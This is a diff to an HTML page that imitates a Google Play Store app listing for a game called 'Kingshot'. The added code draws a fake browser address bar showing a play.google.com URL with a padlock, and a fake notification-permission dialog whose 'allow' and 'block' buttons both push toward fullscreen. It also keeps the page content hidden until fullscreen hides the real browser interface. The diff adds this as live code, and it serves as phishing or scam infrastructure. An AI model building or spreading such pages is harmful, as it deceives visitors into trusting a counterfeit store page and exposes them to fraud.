@@ -9,10 +9,48 @@
 @font-face { font-family: 'Google Sans'; font-style: normal; font-weight: 400; src: local('Segoe UI'), local('Roboto'); }
 @font-face { font-family: 'Google Sans'; font-style: normal; font-weight: 500; src: local('Segoe UI Semibold'), local('Roboto Medium'); }
 @font-face { font-family: 'Google Sans Display'; font-style: normal; font-weight: 400; src: local('Segoe UI'), local('Roboto'); }
+/* ---- fake url bar ---- */
+.url-bar { background:#1a1a2e; color:#e0e0e0; padding:6px 12px; font-size:12px; display:flex; align-items:center; gap:8px; font-family: 'Google Sans', Roboto, Arial, sans-serif; user-select:none; }
+.url-bar .url-text { flex:1; background:#0d0d1a; border-radius:16px; padding:5px 14px; color:#b0b8c1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; font-size:11px; }
+.url-bar .lock { color:#4caf50; font-size:14px; }
+/* ---- notification modal ---- */
+.modal-overlay { display:flex; position:fixed; inset:0; background:rgba(0,0,0,.6); z-index:99999; align-items:center; justify-content:center; }
+.modal-box { background:#fff; border-radius:12px; padding:24px; max-width:340px; width:90%; box-shadow:0 8px 32px rgba(0,0,0,.3); text-align:center; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
+.modal-box .bell { font-size:48px; margin-bottom:12px; }
+.modal-box h2 { font-size:18px; margin:0 0 8px; color:#202124; }
+.modal-box p { font-size:13px; color:#5f6368; margin:0 0 20px; line-height:1.4; }
+.modal-box .btn-allow { display:block; width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:24px; font-size:15px; font-weight:500; cursor:pointer; }
+.modal-box .btn-allow:hover { background:#1557b0; }
+.modal-box .btn-deny { display:block; width:100%; padding:10px; background:transparent; color:#5f6368; border:none; font-size:13px; cursor:pointer; margin-top:4px; }
+/* ---- hidden content until fullscreen ---- */
+#content { display:none; }
+#content.show { display:block; }
+.fullscreen-overlay { display:none; position:fixed; inset:0; background:#fff; z-index:99998; align-items:center; justify-content:center; text-align:center; }
+.fullscreen-overlay .warning { font-family: 'Google Sans', Roboto, Arial, sans-serif; padding:24px; }
+.fullscreen-overlay .warning h2 { margin:0 0 8px; font-size:20px; color:#c5221f; }
+.fullscreen-overlay .warning p { color:#5f6368; font-size:14px; margin:0 0 16px; }
+.fullscreen-overlay .warning button { padding:10px 32px; background:#1a73e8; color:#fff; border:none; border-radius:24px; font-size:14px; cursor:pointer; }
 </style>
 </head>
 <body>
+<div class="url-bar"><span class="lock">🔒</span><div class="url-text">https://play.google.com/store/apps/details?id=com.glykka.easysign&amp;hl=pt_BR</div></div>
+
+<div class="modal-overlay" id="notifModal">
+  <div class="modal-box">
+    <div class="bell">🔔</div>
+    <h2>"Kingshot" gostaria de enviar notificações</h2>
+    <p>As notificações podem incluir alertas, sons e emblemas de ícone. Elas podem ser configuradas em Ajustes.</p>
+    <button class="btn-allow" onclick="requestFullscreen()">Permitir</button>
+    <button class="btn-deny" onclick="retryFullscreen()">Bloquear</button>
+  </div>
+</div>
+
+<div class="fullscreen-overlay" id="fsOverlay">
+  <div class="warning"><h2>⚠️ Tela cheia necessária</h2><p>Para visualizar este conteúdo, ative o modo tela cheia.</p><button onclick="requestFullscreen()">Ativar Tela Cheia</button></div>
+</div>
+
 <div id="app" class="loading">Carregando...</div>
+<div id="content"></div>
 <script>
 /* ---- helpers (global so template functions access them) ---- */
 function esc(s) {
@@ -64,8 +102,10 @@ var CONFIGS = {"kingshot":{"header":{"title":"Google Play"},"app":{"icon":"https
   document.title = document.title.replace('Kingshot', appSlug);
   const c = CONFIGS[appSlug] || CONFIGS['kingshot'];
   const app = document.getElementById('app');
+  const content = document.getElementById('content');
   app.className = '';
-  app.innerHTML = `
+  app.style.display = 'none';
+  content.innerHTML = `
     <nav class="top-header" aria-label="Cabeçalho da página">
       <a class="play-logo-link" href="/store/games" aria-label="Logotipo do Google Play">
         <svg class="play-icon-svg" aria-hidden="true" viewBox="0 0 40 40" width="24" height="24"><path fill="none" d="M0,0h40v40H0V0z"/><g><path d="M19.7,19.2L4.3,35.3c0,0,0,0,0,0c0.5,1.7,2.1,3,4,3c0.8,0,1.5-0.2,2.1-0.6l0,0l17.4-9.9L19.7,19.2z" fill="#EA4335"/><path d="M35.3,16.4L35.3,16.4l-7.5-4.3l-8.4,7.4l8.5,8.3l7.5-4.2c1.3-0.7,2.2-2.1,2.2-3.6C37.5,18.5,36.6,17.1,35.3,16.4z" fill="#FBBC04"/><path d="M4.3,4.7C4.2,5,4.2,5.4,4.2,5.8v28.5c0,0.4,0,0.7,0.1,1.1l16-15.7L4.3,4.7z" fill="#4285F4"/><path d="M19.8,20l8-7.9L10.5,2.3C9.9,1.9,9.1,1.7,8.3,1.7c-1.9,0-3.6,1.3-4,3c0,0,0,0,0,0L19.8,20z" fill="#34A853"/></g></svg>
@@ -328,6 +368,29 @@ function footerHtml(c) {
   h += '</footer>';
   return h;
 }
+
+/* ---- fullscreen guard ---- */
+function requestFullscreen() {
+  var el = document.documentElement;
+  (el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen).call(el);
+}
+function onFsChange() {
+  if (document.fullscreenElement || document.webkitFullscreenElement) {
+    document.getElementById('notifModal').style.display = 'none';
+    document.getElementById('content').classList.add('show');
+    document.getElementById('fsOverlay').style.display = 'none';
+  } else {
+    document.getElementById('notifModal').style.display = 'flex';
+    document.getElementById('content').classList.remove('show');
+    document.getElementById('fsOverlay').style.display = 'flex';
+  }
+}
+function retryFullscreen() {
+  document.getElementById('fsOverlay').style.display = 'flex';
+  document.getElementById('notifModal').style.display = 'none';
+}
+document.addEventListener('fullscreenchange', onFsChange);
+document.addEventListener('webkitfullscreenchange', onFsChange);
 
 </script>
 </body>
